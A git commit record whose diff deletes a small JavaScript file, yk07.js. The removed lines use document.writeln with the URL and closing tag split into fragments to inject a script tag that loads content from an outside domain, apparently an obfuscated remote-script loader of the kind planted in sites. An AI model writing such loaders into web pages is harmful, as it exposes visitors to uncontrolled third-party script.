9e4c111fec2288fafe1bbd246c254d9f2f016a83
jisucdn <79298333+jisucdn@users.noreply.github.com>
2022-01-14 21:09:39 +0800

    Delete yk07.js

--- yk07.js
+++
@@ -1,4 +0,0 @@
-document.writeln('<script id="EX8NDYGmQ2JpXxHkQYLuUV" src="ht')
-document.writeln('tps:')
-document.writeln('//ao.ndfsl.com/webid142/EX8NDYGmQ2JpXxHkQYLuUV.html?'+new Date().getTime()+'"')
-document.writeln('><\/scr' + 'ipt>')
